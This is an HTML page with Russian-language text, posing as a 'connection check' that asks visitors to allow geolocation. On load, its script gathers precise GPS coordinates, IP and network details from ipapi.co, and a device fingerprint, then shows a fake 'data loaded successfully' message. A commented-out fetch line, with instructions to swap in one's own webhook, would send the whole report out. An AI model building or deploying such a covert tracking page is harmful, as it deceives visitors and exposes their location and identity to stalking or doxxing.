<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка данных...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 90%;
            width: 300px;
        }
        h2 { margin-top: 0; font-size: 18px; }
        p { font-size: 14px; color: #666; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 10px; font-size: 12px; color: #007bff; }
    </style>
</head>
<body>

<div class="container">
    <h2 id="title">Проверка подключения</h2>
    <p id="desc">Пожалуйста, разрешите доступ к геолокации для корректной работы сервиса.</p>
    <div class="loader" id="loader"></div>
    <div id="status">Ожидание разрешения...</div>
</div>

<script>
    // 1. Отправка данных на сервер (замени URL на свой webhook, если есть)
    function sendData(data) {
        console.log("Отправлено:", data);
        // Если нужен явный запрос на сторонний сервис, раскомментируй строку ниже:
        // fetch('https://your-webhook-url.com/log', { method: 'POST', body: JSON.stringify(data) });
        
        // Имитация успешной загрузки через 2 секунды
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('title').innerText = "Готово!";
            document.getElementById('desc').innerText = "Данные успешно загружены.";
            document.getElementById('status').innerText = "";
        }, 2000);
    }

    // 2. Сбор информации
    async function gatherInfo() {
        let locationData = null;
        let ipData = {};

        // А. Геолокация
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                locationData = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                document.getElementById('status').innerText = "Геолокация определена...";
            } catch (e) {
                locationData = { error: e.message };
            }
        } else {
            locationData = { error: "Geolocation not supported" };
        }

        // Б. Получение IP и доп. инфы через внешний API (так надежнее, чем просто UserAgent)
        try {
            const response = await fetch('https://ipapi.co/json/');
            ipData = await response.json();
        } catch (e) {
            ipData = { error: "Failed to fetch IP info" };
        }

        // В. Технические данные устройства
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const screenRes = `${screen.width}x${screen.height}`;
        const language = navigator.language;

        const finalReport = {
            timestamp: new Date().toISOString(),
            gps: locationData,
            network: ipData,
            device: {
                userAgent: ua,
                platform: platform,
                resolution: screenRes,
                language: language,
                cores: navigator.hardwareConcurrency || 'unknown',
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown'
            }
        };

    // 3. Отправка
    sendData(finalReport);
    
    // Для отладки выведем в консоль браузера (F12 -> Console)
    console.log(JSON.stringify(finalReport, null, 2));
}

// Запуск при загрузке
window.onload = gatherInfo;
</script>

</body>
</html>
